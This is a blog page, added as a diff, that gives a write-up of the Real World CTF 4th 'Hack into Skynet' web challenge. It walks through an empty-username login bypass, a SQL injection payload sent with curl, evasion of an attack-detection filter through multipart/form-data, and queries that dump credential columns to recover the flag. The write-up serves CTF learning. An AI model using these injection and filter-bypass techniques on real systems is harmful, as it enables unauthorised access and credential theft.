@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Jeongwon Jo" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Real World CTF 4th Hack into Skynet Write Up 
+      
+      
+      |
+    
+     Jeongwon Jo
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Pocas</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="https://pocas.kr">
+          <a target="_blank" rel="noopener" href="https://pocas.kr">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Real World CTF 4th Hack into Skynet Write Up</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2022-01-24 23:29:53
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <p><img src="https://github.com/blogpocas/blogpocas.github.io/blob/main/CTF/Real%20World%20CTF%202022/Hack%20into%20Skynet/1.png?raw=true"><br>There is no sql injection vulnerability in login logic, and login is generally not possible because there is no user account.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">query_login_attempt</span>():</span><br><span class="line">    username = flask.request.form.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    password = flask.request.form.get(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">and</span> <span class="keyword">not</span> password:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    sql = (<span class="string">&quot;SELECT id, account&quot;</span></span><br><span class="line">           <span class="string">&quot;  FROM target_credentials&quot;</span></span><br><span class="line">           <span class="string">&quot;  WHERE password = &#x27;&#123;&#125;&#x27;&quot;</span>).<span class="built_in">format</span>(hashlib.md5(password.encode()).hexdigest())</span><br><span class="line">    user = sql_exec(sql)</span><br><span class="line">    name = user[<span class="number">0</span>][<span class="number">1</span>] <span class="keyword">if</span> user <span class="keyword">and</span> user[<span class="number">0</span>] <span class="keyword">and</span> user[<span class="number">0</span>][<span class="number">1</span>] <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> name == username</span><br></pre></td></tr></table></figure>
+<p>I’ve found some stupid logic in the code of the login logic. If the user variable is an empty value, the empty value of the name variable is put in, and finally the value of the name variable and the username variable is compared. Here, if the name variable and the username variable are both empty values, true is returned, so the login can be successful.</p>
+<p><img src="https://github.com/blogpocas/blogpocas.github.io/blob/main/CTF/Real%20World%20CTF%202022/Hack%20into%20Skynet/2.png?raw=true"><br>As expected, the login was successful when the username value was passed as an empty value. Now that the login was successful, the search logic can be used.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">query_kill_time</span>():</span><br><span class="line">    name = flask.request.form.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> name:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    sql = (<span class="string">&quot;SELECT name, born&quot;</span></span><br><span class="line">           <span class="string">&quot;  FROM target&quot;</span></span><br><span class="line">           <span class="string">&quot;  WHERE age &gt; 0&quot;</span></span><br><span class="line">           <span class="string">&quot;    AND name = &#x27;&#123;&#125;&#x27;&quot;</span>).<span class="built_in">format</span>(name)</span><br><span class="line">    nb = sql_exec(sql)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> nb:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&#125;: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(*nb[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
+<p>SQL injection occurs because the value of name in the query_kill_time() function is passed as it is to the query.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@pocas:~<span class="comment"># curl -i -H &#x27;SessionId=22ab1d4b55f5a686c3c9947c0a5ad830&#x27; http://47.242.21.212:8086/ -d &quot;name=&#x27;or 1=1 --&quot;</span></span><br><span class="line">HTTP/1.0 403 FORBIDDEN</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 234</span><br><span class="line">Server: Werkzeug/0.16.1 Python/3.8.10</span><br><span class="line">Date: Thu, 27 Jan 2022 08:15:34 GMT</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;403 Forbidden&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Forbidden&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;You don\&#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+<p>When attempting sql injection, it was found that the detection mechanism was controlled.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">(...)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">skynet_detect</span>():</span><br><span class="line">    req = &#123;</span><br><span class="line">        <span class="string">&#x27;method&#x27;</span>: flask.request.method,</span><br><span class="line">        <span class="string">&#x27;path&#x27;</span>: flask.request.full_path,</span><br><span class="line">        <span class="string">&#x27;host&#x27;</span>: flask.request.headers.get(<span class="string">&#x27;host&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;content_type&#x27;</span>: flask.request.headers.get(<span class="string">&#x27;content-type&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;useragent&#x27;</span>: flask.request.headers.get(<span class="string">&#x27;user-agent&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;referer&#x27;</span>: flask.request.headers.get(<span class="string">&#x27;referer&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;cookie&#x27;</span>: flask.request.headers.get(<span class="string">&#x27;cookie&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: <span class="built_in">str</span>(flask.request.get_data()),</span><br><span class="line">    &#125;</span><br><span class="line">    _, result = skynet.classify(req)</span><br><span class="line">    <span class="keyword">return</span> result <span class="keyword">and</span> result[<span class="string">&#x27;attack&#x27;</span>]</span><br><span class="line"></span><br><span class="line">(...)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_query</span>():</span><br><span class="line">    <span class="keyword">if</span> skynet_detect():</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> query_login_state():</span><br><span class="line">        response = flask.make_response(<span class="string">&#x27;No login, redirecting&#x27;</span>, <span class="number">302</span>)</span><br><span class="line">        response.location = flask.escape(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flask.request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> flask.send_from_directory(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> flask.request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        kt = query_kill_time()</span><br><span class="line">        <span class="keyword">if</span> kt:</span><br><span class="line">            result = kt </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>, result=result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">400</span>)</span><br></pre></td></tr></table></figure>
+<p>The reason is that the skynet_detect() function was being called before the query_kill_time() function was called. Here again the code was written with very stupid logic.</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">skynet_detect()   : flask.request.get_data()</span><br><span class="line">query_kill_time() : flask.request.form.get()</span><br></pre></td></tr></table></figure>
+<p>In the skynet_detect() function, the get_data() method was used, and in the query_kill_time() function, the form.get() method was used, and the body value was used. Why use it differently? I got a lot of doubts here, and I thought this would be important in solving the challenge.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@pocas:~<span class="comment"># curl -i -H &#x27;SessionId=22ab1d4b55f5a686c3c9947c0a5ad830&#x27; http://47.242.21.212:8086/ -d &quot;name=&#x27;or 1=1 --&quot; -H &quot;Content-Type: application/json&quot;</span></span><br><span class="line">HTTP/1.0 403 FORBIDDEN</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 234</span><br><span class="line">Server: Werkzeug/0.16.1 Python/3.8.10</span><br><span class="line">Date: Thu, 27 Jan 2022 08:22:35 GMT</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;403 Forbidden&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Forbidden&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;You don\&#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.&lt;/p&gt;</span><br><span class="line">root@pocas:~<span class="comment"># curl -i -H &#x27;SessionId=22ab1d4b55f5a686c3c9947c0a5ad830&#x27; http://47.242.21.212:8086/ -d &quot;name=&#x27;or 1=1 --&quot; -H &quot;Content-Type: application/xml&quot;</span></span><br><span class="line">HTTP/1.0 403 FORBIDDEN</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 234</span><br><span class="line">Server: Werkzeug/0.16.1 Python/3.8.10</span><br><span class="line">Date: Thu, 27 Jan 2022 08:22:39 GMT</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;403 Forbidden&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Forbidden&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;You don\&#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+<p>So, while changing the value of <code>Content-Type</code> as above, I tried to bypass the detection mechanism by using the difference in parsing between the two functions. but no response. However, the important thing is that I did not use the file upload function using Multipart&#x2F;form-data. When a file is uploaded, not only the file name and contents, but also various values exist as binary data. So I thought that if I tried using these functions, the values could be mixed and bypassed.</p>
+<p><img src="https://github.com/blogpocas/blogpocas.github.io/blob/main/CTF/Real%20World%20CTF%202022/Hack%20into%20Skynet/3.png?raw=true"><br>As expected, it was strangely detoured.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> string_agg(column_name, <span class="string">&#x27;,&#x27;</span>),<span class="keyword">null</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;target_credentials&#x27;</span> <span class="comment">--</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="comment">-- id,account,password,access_key,secret_key: None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> string_agg(secret_key, <span class="string">&#x27;,&#x27;</span>),<span class="string">&#x27;f&#x27;</span> <span class="keyword">from</span> target_credentials <span class="comment">--</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="comment">-- rwctf&#123;t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n&#125;,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937: f</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG : rwctf&#123;t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/11/26/2021-11-29-CVE-2021-3815/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2022-01-24 23:29:53
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/02/13/2022-02-13-Hayyim-CTF/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/P0cas">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        Copyright © 2023 Pocas
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Real%20World%20CTF%204th%20Hack%20into%20Skynet%20Write%20Up + '&url=' + https%3A%2F%2Fblog.pocas.kr%2F2022%2F01%2F24%2F2022-01-24-RealWrold-CTF%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://blog.pocas.kr/2022/01/24/2022-01-24-RealWrold-CTF/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
